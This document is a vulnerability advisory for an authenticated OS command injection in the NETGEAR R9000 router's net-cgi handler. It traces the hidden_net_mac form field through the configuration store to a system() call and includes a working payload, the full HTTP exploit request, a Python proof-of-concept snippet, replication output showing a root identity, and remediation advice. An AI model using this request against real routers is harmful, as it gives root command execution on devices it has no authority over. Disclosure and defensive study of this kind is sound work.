# NETGEAR R9000 (Nighthawk X10) - plex_net_dev MAC Argument Command Injection Executing as the Root-Configured CGI Stack

Advisory: https://0day-rubbish.com/blog/plex-net-dev-mac-command-injection
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## 1. Overview

### Overview of the finding

The NETGEAR R9000 (Nighthawk X10) exposes its administration plane through `uhttpd`, listening on ports
80 and 443 and dispatching CGI requests under the `/cgi-bin` prefix. The handler that answers most
configuration-changing requests is a single large, stripped ARM binary, `/usr/sbin/net-cgi` (933403
bytes, ARM EABI5 ELF). Configuration state is not held per-page; it lives in a shared key/value store
that handlers write with a setter wrapper and read back with `config_get()`. Several parts of the
management interface are thin front ends over that store, and one of them is the "network drive" page
family, whose back end is the helper program `/usr/sbin/plex_net_dev`, invoked with an action word
(`--add`, `--edit`, `--del`) and a MAC address.

The handler does not call that helper with an argument vector. It formats a command line as a string and
hands the string to `system()`, which executes it through `/bin/sh -c`. The string is built from a value
read out of the configuration store under the key `plex_changed_mac`, and nothing on the way from the
HTTP form field to the shell inspects that value: there is no MAC-format check, no character-class
blocklist, no length gate beyond a 32-byte copy, and no quoting. A request that sets `hidden_net_mac` to
shell syntax therefore reaches a shell as syntax, and the resulting command runs with the identity of the
CGI process, which the research record identifies as root on this platform.

The defect is a single unquoted `%s`, and its consequences are as large as the handler's privileges:
arbitrary command execution on the router from one authenticated POST. The research record's dynamic
evidence for it is a sink-level replication - the exact reconstructed `system()` argument, executed
through a native `/bin/sh -c` - which produced a marker containing
`uid=0(root) gid=0(root) groups=0(root)` while a benign control value produced none. That result was
observed inside a replication environment; it was not observed on R9000 hardware. Section 9 keeps the two
halves of the evidence separate: what disassembly establishes, and what the replication measured.

### Overview of the product, the artifact and the web plane

Three properties of the analyzed image shaped the whole audit and are worth stating up front, because
they explain where the finding sits:

- The web plane is a two-process arrangement. `uhttpd` terminates HTTP and HTTPS and forwards CGI
  requests to `/usr/sbin/net-cgi`, which parses the request, decides which sub-action to run, mutates the
  configuration store, and in some cases invokes external helpers. Page names appear in the request path
  and action names in the `submit_flag` field, so a single endpoint serves a large number of distinct
  operations.
- The configuration store is the interface between the two halves of almost every feature. Handlers write
  request-derived values into it and later code reads them back, which means a value that passes through
  the store can be re-read by a sink in a different function, in a different request phase, with the
  writer's validation assumptions no longer in scope.
- The `plex_net_dev` helper is invoked by string construction, not by `execve()`. That single
  implementation choice is what turns a trusted-in-principle configuration value into a shell injection
  primitive: the helper itself would treat `--mac` as an opaque argument, but the shell that launches it
  does not.

The finding is not a memory-safety defect. The 32-byte destination buffer is written with `strlcpy`, the
128-byte command buffer is written with the bounded `sprintf`-family call, and the recorded payload is
28 bytes. Nothing here overflows, and nothing needs to.

### Overview of the research method

The audit moved from the setter back to the sink. The question that had to be answered was not "is there
a `system()` call with a `%s`" - there are many - but "is there a `system()` call whose `%s` is filled
from a request field with no validation in between". Answering it required four steps, each of which is
reproduced in the sections that follow: locating the dispatch case for the network-drive add action,
tracing the form field it consumes into the setter wrapper that writes `plex_changed_mac`, locating the
function that reads that key back and formats it into a command line, and confirming that the dispatch
flag raised by the setter's own request causes the sink to run before the request completes.

Two independent review passes were applied to the result. A re-analysis pass confirmed that the sink
reads the configuration key and reaches `system()` with no sanitization between them, and that the key is
written at a position reachable from the POST body. A falsification pass attempted to break the chain and
instead confirmed each link: the add-handler reads the `hidden_net_mac` form field (not the key itself),
writes it through the wrapper at `0x21334` with no sanitization and no MAC validation, the sink uses the
real `system()` rather than an `execve()` helper, the 32-byte copy does not truncate the payload, and the
authentication gate fails closed. The same falsification pass rejected two other candidate sinks in the
same binary, which is how the audit knows this is the reachable one rather than merely the loudest one.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Item | Value established by this research |
|---|---|
| Vendor | NETGEAR, consumer networking |
| Product | R9000 (Nighthawk X10) router |
| Version analysed | the research record names no firmware version string; the artifact is pinned by binary size 933403 bytes, ARM EABI5, stripped |
| Web plane | `uhttpd` on ports 80 and 443, CGI prefix `/cgi-bin` |
| Handler binary | `/usr/sbin/net-cgi`, 933403 bytes, ARM EABI5 ELF, stripped |
| Vulnerable path | network-drive add action: `submit_flag=config_plex_net_add` |
| Source field | `hidden_net_mac` (HTTP POST form field) |
| Stored key | `plex_changed_mac`, written via setter wrapper `0x21334` |
| Sink function | `fcn.000207e0` |
| Format string | `/usr/sbin/plex_net_dev --add --mac %s --num %s >/dev/console` |
| Sink API | `system()`, PLT `0x0000afac` |
| Sanitization | none - NULL check only at `0xa3fbc`; no MAC-format validation; no shell quoting |
| Length bound on the value | `strlcpy(..., 32)` into a 32-byte stack buffer |
| Payload used | `;id>/tmp/r9000_marker_v3;#` (28 bytes) |
| Observed identity | `uid=0(root) gid=0(root) groups=0(root)` in the sink-level replication |
| Authentication | administrator session, `auth_token` cookie, fail-closed |
| Published score | 7.2 High - `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| CWE | CWE-78 |

### Vulnerability Summary mechanics

The sink function, reconstructed from the disassembly of the stripped image, is short enough to read in
full:

```c
void fcn.000207e0(void) {
    void *arg2;
    char *pcVar1;
    uint uVar3;
    uchar auStack_a8[32];
    char acStack_88[128];

    arg2 = sym.imp.config_get("plex_changed_mac");
    sym.dni_strlcpy(auStack_a8, arg2, 0x20);   // 32-byte copy, NO shell filter

    pcVar1 = sym.imp.config_get("plex_net_action");
    if (strcmp(pcVar1, "add") == 0) {
        uVar3 = sym.imp.config_get("plex_net_index");
        sym.imp.dni_sprintf_s(*0x20950, 0x885, acStack_88, 0x80,
            "/usr/sbin/plex_net_dev --add --mac %s --num %s >/dev/console",
            auStack_a8, uVar3);   // <-- %s RAW, no quoting
    } else if (strcmp(pcVar1, "edit") == 0) {
        // --edit branch, same %s pattern
    } else if (strcmp(pcVar1, "delete") == 0) {
        // --del branch, same %s pattern
    }
    sym.imp.system(acStack_88);   // <-- root shell execution
}
```

Three of its decisions carry the finding. First, the configuration value is copied with `strlcpy` into a
32-byte buffer - a memory-safety measure, not an input filter; it bounds length and does nothing about
content. Second, the value is interpolated into the format string at an unquoted `%s`, so the shell sees
whatever bytes the value contains in command position. Third, the completed 128-byte string is handed to
`system()` at PLT `0x0000afac`, the library interface that guarantees a `/bin/sh -c` parse between the
handler and the kernel.

The action selector is a plain `strcmp` chain over `plex_net_action`, and all three branches use the same
construction with a different helper verb (`--add`, `--edit`, `--del`). The `add` branch is the one
documented here because it is the branch the recorded request drives, but the defect is identical in the
other two, which matters for remediation: a patch that quotes only the `add` format string would leave
two live constructions behind.

### Vulnerability Summary preconditions

1. The attacker holds an administrator session on the device. The request is gated by the `auth_token`
   cookie and the gate fails closed, so no unauthenticated request reaches the handler.
2. The attacker can reach the device's web plane over HTTP or HTTPS - the request is an ordinary POST to
   `/apply.cgi` with a `submit_flag` selecting the network-drive add action.
3. Nothing else. There is no race, no memory layout to groom, no reboot window, no second request to
   prime state, and no dependency on any particular firmware setting beyond the presence of the handler
   in the analyzed image.

## 3. Authentication Boundary

### Authentication Boundary - what the gate is

`/apply.cgi` requires the `auth_token` cookie. The research record identifies the check as fail-closed:
a request without a valid session does not fall through to the handler, it is refused, and the
"Unauthorized" string the binary emits on that path sits at `0x000a6f32`. Login state is tracked through
`/tmp/is_login_%s`, the per-session marker file the login path creates. The recorded exploit client
therefore performs a login first and carries the resulting cookie into the `apply.cgi` POST, which is
exactly what a legitimate administrator's browser does.

The consequence for classification is direct: this is a post-authentication finding by construction.
The request reaches `0xa3e50` only with a legitimate administrator session behind it, so the chain's
privilege requirement is the administrator credential, not a lesser one, and there is no bypass step
anywhere in it.

### Authentication Boundary - what the chain does not do

- It does not bypass authentication. The session gate is consumed, not defeated; the recorded client
  logs in and then sends the malicious request with the cookie the login produced.
- It does not depend on default credentials. The request succeeds whatever the administrator's password
  is, and rotating that password changes nothing about the defect. The finding is not in the
  credential-management family at all.
- It does not attack the request parser, the cookie handling or the transport. The POST is well formed,
  correctly encoded and schema-conformant for the endpoint; the only unusual thing about it is the
  content of one form field.
- It does not need a second request. The dispatch mechanism inside the handler raises a per-request flag
  that causes the sink to run during the same request that stores the value, so there is no window in
  which the device holds a tainted key waiting for someone else's request to read it.

### Authentication Boundary - why the boundary does not soften the impact

An administrator of a consumer router can already change settings, so it is fair to ask what the
injection adds beyond what the credential already grants. The answer is the difference between the
product's intended management surface and the operating system beneath it. The management plane exposes
a defined and finite set of operations - change a MAC entry, restart a service, alter a wireless
setting - and none of those operations is "run this command". The chain leaves that surface and returns
with the full authority of the CGI process: read every file root can read, write every path root can
write, control every process root can signal. A well-run deployment assumes that whoever holds the
settings password is not, by that fact alone, an operating-system administrator on the network's
chokepoint device. This finding is precisely the collapse of that assumption, and that collapse is what
the privilege metric and the impact metrics describe.

## 4. Attack Surface

### Attack Surface - the request path and the dispatch mechanism

The management interface posts to `/apply.cgi`, with the page name carried in the query string and the
operation selected by the `submit_flag` form field. For the network-drive add operation the request has
this shape:

```
POST /apply.cgi?/plex_network_drive.htm timestamp=<ts>
Content-Type: application/x-www-form-urlencoded

submit_flag=config_plex_net_add
hidden_net_mac=<value>
plex_net_index=0
plex_net_action=add
```

Inside `net-cgi`, the dispatch-setup stage at `0x13700` matches `submit_flag=config_plex_net_add`, sets
the per-request dispatch flag at `[0x141678+0x178]` to 1, and calls the add-handler at `0xa3e50`. The
handler's field table sits at `0xe2f1c`, and the network-drive add entry is index 1 of that table. The
dispatch loop at `0x13850` then checks the flag and, finding it set, calls the sink `fcn.000207e0` before
the request is finished.

That ordering is the architectural fact that makes the finding a single-request exploit rather than a
stored-state puzzle: the same POST that writes the tainted configuration value is the POST that reads it
back and interpolates it into a command line.

### Attack Surface - the field the handler actually reads

A detail that the analysis had to settle, because getting it wrong changes the exploit: the form field is
`hidden_net_mac`, not `plex_changed_mac`. The add-handler extracts the field value with the getter at
`0x12c40` and then stores it under the configuration key `plex_changed_mac` through the setter wrapper at
`0x21334`. The two names differ, and a client that posted `plex_changed_mac=<payload>` would be writing a
field nothing reads.

```c
/* add-handler fcn.000a3e50, field table 0xe2f1c index 1 */
form_value = getter_0x12c40(form, "hidden_net_mac");   /* 0xa3fb0 */
if (form_value == NULL) { /* reject */ }               /* 0xa3fbc - NULL test only */
config_set("plex_changed_mac", form_value);            /* 0xa4038, wrapper 0x21334 */
```

There is no length check on the value beyond the 32-byte copy the sink performs, no character-class
check, no MAC-format check and no canonicalisation of separators. The record states this plainly: the
setter path contains zero sanitization and zero MAC validation.

### Attack Surface - components that narrowed out

The same binary contains two other candidates that were examined and excluded, and stating them is part
of stating the surface honestly:

- `amazon_usbcheck` reads the `hid_usbcheck` form field and passes it through the numeric validator at
  `fcn.000286f4`, which accepts only the values in the range [2,4]. Shell metacharacters are rejected
  there, so the path is not injectable regardless of what the downstream construction looks like.
- `plex_name` is read only from `/tmp/plex_curUSB_info`, the file the USB daemon writes. No HTTP form
  field sets it, so an attacker cannot reach it with request content in this chain.
- The remaining `system()` call sites in `net-cgi` build their command lines from fixed literals rather
  than from request data, so they carry no injection surface of this kind.

This narrowing is why the advisory names one handler and one key rather than describing a pattern: within
the analyzed image, the network-drive add path is the construction that both interpolates request data
and is reachable from an authenticated POST.

## 5. Sink Identification

### Sink Identification - the construction

The sink is `fcn.000207e0`, and its whole defect is visible in one line of its reconstructed body:

```c
sym.imp.dni_sprintf_s(*0x20950, 0x885, acStack_88, 0x80,
    "/usr/sbin/plex_net_dev --add --mac %s --num %s >/dev/console",
    auStack_a8, uVar3);
sym.imp.system(acStack_88);
```

The source of `auStack_a8` is `config_get("plex_changed_mac")`, copied in with `dni_strlcpy(..., 0x20)`.
The destination `acStack_88` is 128 bytes, and the bounded `sprintf` receives that bound as `0x80`, so
the construction is length-safe; it is content-unsafe. The `%s` for the MAC value is unquoted, which
means the shell applies word splitting, globbing and command substitution to it exactly as it would to
text the operator typed. The second `%s` takes `plex_net_index`, an integer read from the configuration
store, and is not attack-relevant here.

The command finishes with `>/dev/console`, a redirection intended to surface the helper's output on the
device console. It has a secondary effect worth naming: because the redirection applies to the
`plex_net_dev` command, meta-characters placed before it can redirect their own output independently,
which is what the recorded payload does.

### Sink Identification - the execution interface

`system()` is reached through the PLT entry at `0x0000afac`. That choice matters more than the format
string does. `system()` is specified to pass its argument to `/bin/sh -c`, so the argument is parsed
twice: once by the handler's formatter, which produces a single opaque byte string, and once by the
shell, which gives that byte string meaning as a program with arguments, separators, redirections and
comments. Every character class the shell recognises - `;`, `#`, backtick, `$( )`, quotes, pipes - is
therefore live in a value the handler believed it was passing as data. Had the same helper been invoked
with an `execve()`-family call and a `char *argv[]`, the identical value would have been an opaque
argument and this finding would not exist.

### Sink Identification - the identity that runs it

`system()` children inherit the identity of the calling process, so the impact of the sink is the
identity of `net-cgi`. The research record identifies that identity as root on this platform, and
attributes it to the web server configuration, whose user is root. The measured confirmation of that
identity is the replication marker `uid=0(root) gid=0(root) groups=0(root)`, produced in the sink-level
harness and read from the marker file; the replication ran as root by design to mirror the configuration
reading. That measurement is a replication result, not a device observation, and Section 9 states the
boundary in full.

## 6. Source Identification

### Source Identification - the field and its single check

The source is the `hidden_net_mac` POST field. Its extraction is at `0xa3fb0`, through the form getter
at `0x12c40`. The only check applied to it before it enters the configuration store is the NULL test at
`0xa3fbc`. The store write happens at `0xa4038` through the setter wrapper at `0x21334`.

Reading the sequence as a data-flow question: what constraints does the value face before it reaches
`system()`? Exactly one, and it is applied downstream of the store rather than at the door - the
`strlcpy(..., 0x20)` in the sink, which caps the value at 31 bytes plus a terminator. Everything else
about the value is unconstrained.

### Source Identification - what the 32-byte bound does and does not do

The bound is the reason the payload had to be chosen carefully, and it is the reason the payload works.
The recorded value is:

```
;id>/tmp/r9000_marker_v3;#
```

Twenty-eight bytes - three bytes of headroom under the 31-byte content limit. It is not truncated, so
every component survives the copy intact. A shorter command body fits trivially; a longer one has to be
split across stages or written through a redirect from a stream the attacker controls, which is the
standard embedded-device idiom and is not needed for the marker used here.

The bound does not filter anything. A `strlcpy` with a size argument is a memory-safety primitive: it
stops the copy at the buffer's capacity so that no overflow occurs. It has no opinion about `;`, `#`, `$`
or backticks, and it does not reject, escape or normalise them. The record states the consequence
directly: after the copy the value is interpolated raw into the format string.

### Source Identification - why no boundary in the middle helps

Between the form field and the shell there are three boundaries a reader might expect to filter the
value, and none of them does:

| Boundary | What it does | Effect on the payload |
|---|---|---|
| form getter `0x12c40` | extracts the field value from the parsed body | returns the bytes verbatim, including `;`, `>`, `#` |
| setter wrapper `0x21334` | writes the value into the configuration store | stores the bytes with no transformation |
| `config_get` + `strlcpy` in the sink | reads the key back, copies it into a 32-byte buffer | copies the bytes; no character filtering |
| bounded `sprintf` + `system()` | formats and executes | interpolates and hands to `/bin/sh -c` |

A value therefore crosses four components without meeting a single content check. That is the entire
source-side story, and it is why the remediation section asks for validation at the field and for
removal of the shell rather than for a better blocklist somewhere in the middle.

## 7. Data Flow

### Data Flow - end to end

```
[ADMINISTRATOR SIDE]                        [ROUTER, uhttpd + net-cgi]
admin session (auth_token cookie, fail-closed)
        |
        |  POST /apply.cgi?/plex_network_drive.htm timestamp=<ts>
        |  body: submit_flag=config_plex_net_add
        |        hidden_net_mac=;id>/tmp/r9000_marker_v3;#
        |        plex_net_index=0
        |        plex_net_action=add
        v
        uhttpd -> /usr/sbin/net-cgi -> dispatch-setup 0x13700
        matches submit_flag=config_plex_net_add
        sets dispatch flag [0x141678+0x178] = 1
        calls add-handler fcn.000a3e50 (field table 0xe2f1c, index 1)
        |
        form_value = getter_0x12c40(form, "hidden_net_mac")     [0xa3fb0]
        NULL check only                                        [0xa3fbc]
        config_set("plex_changed_mac", form_value)             [0xa4038, wrapper 0x21334]
        |
        dispatch loop 0x13850 sees flag == 1
        calls sink fcn.000207e0
        |
        config_get("plex_changed_mac") -> strlcpy(32)          [no content filter]
        config_get("plex_net_action") == "add"
        sprintf_s -> "/usr/sbin/plex_net_dev --add --mac ;id>/tmp/r9000_marker_v3;# --num 0 >/dev/console"
        system(...) -> /bin/sh -c
        |
        sh parse: ";" ends the --mac argument, "id > marker" runs
                  "#" comments out --num 0 >/dev/console
```

### Data Flow - properties worth naming

- The taint never crosses a memory-safety boundary. It is string data carried from a parsed body into a
  configuration store, out of that store into a 32-byte buffer, into a 128-byte command buffer, and into
  a shell. Two bounded copies bracket the whole path, and neither of them is a filter.
- The decisive re-parse is performed by the component the handler itself chose: `system()` always means
  `/bin/sh -c`, so the second parse is the product's own architecture rather than an attacker
  contrivance.
- The store is a pass-through, not a sanitiser. Writing the value and reading it back in the same
  request means the writer's (absent) validation is the only validation the reader gets, and the reader
  is in a different function with no knowledge of where the bytes came from.
- The `plex_net_action` and `plex_net_index` fields are part of the same POST and are consumed by the
  same sink. The action value must be `add`, `edit` or `delete` for a branch to be taken (`add` in the
  recorded request), and the index is interpolated as an integer. Neither is a defence: they select
  which construction runs, not whether the value is clean.
- Nothing in the chain depends on parser quirks, encodings or trailing-byte tricks. The body is
  ordinary form encoding, and the payload is ordinary shell syntax.

## 8. Exploit Construction

### Exploit Construction - payload shape

The payload is three components: a separator, a command, and a comment.

```
;id>/tmp/r9000_marker_v3;#
```

The leading `;` terminates the `--mac` argument - which is left empty, and the helper never complains
because the shell reaches the next statement first - and starts a new command. The command writes the
output of `id` to a marker file under `/tmp`. The trailing `#` begins a shell comment that swallows
everything the handler appended after the value: the `--num 0` argument, the `>/dev/console`
redirection and any further literal text. Without the comment the injected command would still run, but
the trailing tokens would be appended to it as arguments; with the comment the remainder of the
constructed line is inert.

The resulting argument to `system()` is exactly what the record captured:

```
/usr/sbin/plex_net_dev --add --mac ;id>/tmp/r9000_marker_v3;# --num 0 >/dev/console
```

Parsed by `sh -c`, that line runs `id` with its output redirected to the marker, and the helper
invocation in front of it is an empty command that exits immediately. The helper binary does not need to
exist for the injection to succeed, which is why the replication environment - where `plex_net_dev` is
absent - still produced the marker.

### Exploit Construction - request shape

```http
POST /apply.cgi?/plex_network_drive.htm%20timestamp=1 HTTP/1.1
Host: <router>
Cookie: auth_token=<session token from login>
Content-Type: application/x-www-form-urlencoded

submit_flag=config_plex_net_add&plex_net_action=add&hidden_net_mac=%3Bid%3E%2Ftmp%2Fr9000_marker_v3%3B%23&plex_net_index=0
```

The login that produces the cookie is an ordinary POST to `/login.cgi` with the administrator
credentials, and the client keeps the cookie jar across the two requests. The apply request itself is
indistinguishable from a legitimate network-drive addition except for the content of `hidden_net_mac`,
which is the field the handler fails to inspect.

### Exploit Construction - the shipped client

The PoC shipped with this advisory is `exploit/netgear_r9000_plex_net_dev_poc.py`. It is a single-file,
standard-library client with two modes. `--verify` replicates the sink: it builds the exact
`system()` argument from the payload and the recorded format string, executes it through a native
`/bin/sh -c`, and reports whether the marker appeared - the same measurement the research record
performed. The default target mode posts the login and the inject request to a device, with `--target`
defaulting to the documentation address `192.0.2.10` so that an unconfigured run cannot reach anything,
and `--port` defaulting to 80.

```python
SINK_FMT = "/usr/sbin/plex_net_dev --add --mac %s --num %s >/dev/console"
MARKER = "/tmp/r9000_marker_v3"

def payload_for(command):
    return ";%s;#" % command

def build_command(payload, index="0"):
    return SINK_FMT % (payload, index)
```

The default command is `id>/tmp/r9000_marker_v3`: it writes one file and nothing else. The client does
not brute-force credentials, does not install persistence, does not open an interactive channel, and
does not parse device state - it sends the request, prints the response status, and tells the operator
where the marker would be.

### Exploit Construction - what the PoC deliberately does not do

- It ships no credential. The administrator password is an argument the operator supplies.
- It performs no destructive action. The default command reads the process identity; the marker file it
  writes is the only filesystem effect.
- It does not chain further. There is no second stage, no download, no listener and no lateral step; the
  chain documented here ends at command execution, and the advisory's impact section stops where the
  evidence stops.
- It targets its own recorded mechanism only. The payload is the one the record verified, the format
  string is the one the disassembly shows, and the request fields are the ones the handler reads.

## 9. Dynamic Verification

### Dynamic Verification - environment and method, stated exactly

| Element | Value |
|---|---|
| Verification method | sink-level replication on a cloud-hosted Linux sandbox, native `/bin/sh -c` |
| Host platform | x86-64 Linux, 32 vCPU, 30 GiB memory - not ARM, not the device |
| Replicated elements | the recorded payload, the exact `system()` argument reconstructed from the disassembly, and `system()`'s `/bin/sh -c` execution semantics |
| Not performed | any live HTTP request against R9000 hardware; no physical unit was driven or emulated |
| Privilege model of the harness | executed as root, mirroring the root identity the record reads from the device's web server configuration |
| Observation channel | the marker file `/tmp/r9000_marker_v3`, read from the harness filesystem |
| Control | a benign MAC value with no shell metacharacters traversing the same construction |

### Dynamic Verification - the run, verbatim

The recorded run is reproduced here as the record holds it:

```
[*] config_get('plex_changed_mac') = ;id>/tmp/r9000_marker_v3;#
[*] system() argument: /usr/sbin/plex_net_dev --add --mac ;id>/tmp/r9000_marker_v3;# --num 0 >/dev/console
[*] sh -c return code: 0
[+] INJECTION CONFIRMED - marker content:
    uid=0(root) gid=0(root) groups=0(root)
[+] CONTROL: benign input (no metacharacters)
[+] CONTROL OK - no marker with benign input (correct)
```

Three observations follow from those lines and each of them is load-bearing:

- The marker content is a root identity. It was measured in the replication environment under the
  harness privilege model described above; the mapping to the device rests on the record's reading of
  the web server configuration, not on a live-device observation.
- The shell's exit status was 0, so the command line was syntactically valid and the injected statement
  was executed as a statement rather than being swallowed as an argument.
- The control value `AA:BB:CC:DD:EE:FF` produced no marker. That negative is what makes the marker
  attributable to the payload content rather than to the surrounding construction: the same format
  string, the same shell and the same redirect produced nothing until a metacharacter was introduced.

### Dynamic Verification - the boundary, stated as the record states it

The record is careful about what this run does and does not prove, and this advisory keeps that
distinction:

- The replication proves the sink is injectable. It does not, by itself, prove HTTP reachability. The
  request path - the `submit_flag` dispatch, the add-handler, the `hidden_net_mac` field, the store
  write and the per-request dispatch flag - is established by static analysis of the binary, and the
  record presents it as a separately established link in the chain rather than as a measured one.
- The replication host lacks `plex_net_dev`. That does not weaken the result: the semicolon terminates
  the helper invocation before the shell resolves it, so the injected command executes independently of
  the helper's presence, and a "not found" diagnostic from the helper would not suppress the statement
  that follows it. On ARM hardware the helper exists and the injected statement behaves the same way.
- No end-to-end HTTP run against a device is recorded. The recorded client supports a target mode that
  requires a running R9000 instance; that mode was not exercised against hardware as part of the
  evidence, and this advisory does not claim it was.
- No persistence, no lateral movement, no radio- or bootloader-level effect and no memory-corruption
  behaviour was tested or claimed.

## 10. Reachability and Security Impact

### Reachability - who can send the request

The request is an authenticated POST to the device's web plane. Reaching it requires two things: network
access to the web plane on ports 80 or 443, and an administrator session. The first is the ordinary
condition of a management interface - the device's own LAN, and any wireless client it admits, is
inside that boundary in the default deployment shape; whether a particular deployment exposes the plane
more widely is a deployment decision the record does not examine, and this advisory does not assert one.

The credential requirement defines the affected population precisely rather than shrinking it to
nothing. It covers every legitimate holder of the administrator credential - the owner, a delegated
household or office administrator, a managed-service operator - on any station that can reach the
management plane, and it covers any party who has obtained that credential by other means, for whom this
finding converts web-console access into an operating-system shell without a further step. The second
group is the one that makes authenticated findings worth fixing: session theft, password reuse and
credential sharing are ordinary incidents, and each of them escalates to root through this handler.

### Reachability - impact in concrete terms

Command execution as the root-configured CGI process means, on this class of device:

- the complete configuration store, including the credentials and keys the firmware retains for its own
  operation, is readable by the injected command;
- the device's networking semantics - interfaces, routes, firewall state, the resolver the LAN depends
  on - are writable by it, which turns a compromised router into an interior attack position rather than
  a single compromised host;
- persistence is available to the extent the writable filesystem allows: startup scripts, account
  entries, scheduled work;
- availability is at its discretion, from service control to filesystem destruction.

None of that is beyond what root on an embedded Linux device normally means, and none of it needs to be
inflated: the finding is significant precisely because it is ordinary root on a device that sits at the
chokepoint of a network, obtained through an interface that was supposed to expose only MAC-address
management.

### Reachability - why the score is 7.2 and not higher

The published vector is `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`, which computes to 7.2. The
constraint that keeps it there is the privilege requirement, not any mitigation in the product: the
impact metrics are all High and the exploitability metrics are all at their easiest values except
privileges. This is the honest shape of the finding - trivially exploitable by anyone who already holds
the administrator credential, and unavailable to anyone who does not. The recorded 8.8 reading, printed
with its own vector and arithmetic in the summary, would require a reduced-privilege principal on this
web plane, and the artifacts document none.

## 11. Fix Recommendations

1. Validate `hidden_net_mac` as a MAC address before it is stored. Accept only
   `^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$` with a bounded length, reject everything else with an explicit
   error, and do the check in the add-handler at `0xa3e50` rather than downstream. This is the smallest
   change that removes the injection, and it also fixes the two sibling branches if applied to the
   shared validation path.
2. Remove the shell from the `plex_net_dev` invocation in `fcn.000207e0`. The helper takes an action
   word, a MAC value and an index; that is an argument vector, and it should be executed with an
   `execve()`-family call and a `char *argv[]`. With no shell in the path, the content of the value
   stops being syntax, which closes the class for every future caller of the same helper.
3. Do not let request data round-trip through the configuration store on its way to a command. The
   `plex_changed_mac` key is written from the form and read back by the sink; passing the validated
   value directly from the handler to the invocation removes the window in which a tainted key sits in
   the store and removes the need to trust every future reader of that key.
4. If a shell-based construction must survive one release cycle, quote the interpolated value in single
   quotes with literal single-quote escaping, and add a post-construction assertion that the finished
   command line contains no byte outside the MAC alphabet and the fixed literal text. Fail the request
   when the assertion trips instead of calling `system()`.
5. Apply the fix to all three branches. `plex_net_action` selects `add`, `edit` or `delete`, and each
   branch builds its command line the same way. A patch that touches only the documented branch leaves
   two reachable constructions behind.
6. Run `net-cgi` as an unprivileged identity. The record reads root from the web server configuration.
   Changing that does not fix the injection, but it caps what any injection in this binary - the
   component with the largest request-facing surface on the device - is worth to an attacker.
7. Audit every `config_get()` result that reaches `system()` in the same binary, on the model that a
   configuration value written from a request is request data. The two excluded candidates in section 4
   show that the audit has to be done per path rather than per call site: one was safe because of a
   numeric validator upstream, the other because its value came from a daemon-written file rather than
   from HTTP.
8. Build a regression case at the handler level: submit `config_plex_net_add` with
   `hidden_net_mac=;id>/tmp/marker;#` and assert either rejection or no marker; then submit a benign
   `AA:BB:CC:DD:EE:FF` and assert the normal path still works. The negative control is the half of the
   test that catches a handler which silently accepts everything, which is the failure mode this finding
   is an instance of.
9. For operators, until a patch ships: keep the management plane on trusted segments, disable remote
   administration where it is not needed, and treat the administrator credential as equivalent to a root
   shell on the device - because on this firmware it is.

## 12. CWE

### CWE - classification

The published classification is CWE-78, Improper Neutralization of Special Elements used in an OS
Command, which is the OS command injection class. Every element of the chain is an instance of it: a
request-controlled value, an unquoted interpolation into a command string, a `system()` execution
interface that guarantees a shell parse, and a breakout built out of the shell's own grammar - a
statement separator, a redirection and a comment.

### CWE - why CWE-78 rather than a validation class

The validation gap is real - the handler performs a NULL check and nothing else - and CWE-20, Improper
Input Validation, describes that half of the defect accurately. It is not the published classification
because the classification follows the sink, and the sink is a shell command line. Naming the finding
CWE-20 alone would locate the defect in the field parser and suggest that a better field check is the
fix; the durable fix is the removal of the shell from the path, which is a CWE-78 remediation. CWE-20 is
therefore described here as the contributing weakness behind the same defect, not as a second assigned
class.

### CWE - classes considered and not applied

- CWE-88, Argument Injection, does not apply: the value is not appended as an argument word to a safely
  invoked program, it is interpolated into a command string that a shell re-parses, so the injection is
  at the command level rather than the argument level.
- CWE-426, Untrusted Search Path, does not apply: the executable path is a fixed literal,
  `/usr/sbin/plex_net_dev`, and the attacker's value does not influence which program is resolved.
- CWE-787 and the memory-corruption family do not apply: the two copies on the path are bounded
  (`strlcpy` with 32 bytes and a bounded `sprintf` with `0x80`), and no length-controlled write occurs.
- CWE-306, Missing Authentication for Critical Function, does not apply: the function requires an
  administrator session and enforces it fail-closed. The defect is what the function does with an
  authorized caller's input, not who is allowed to call it.

---

Written by the 0day Rubbish Research Team.
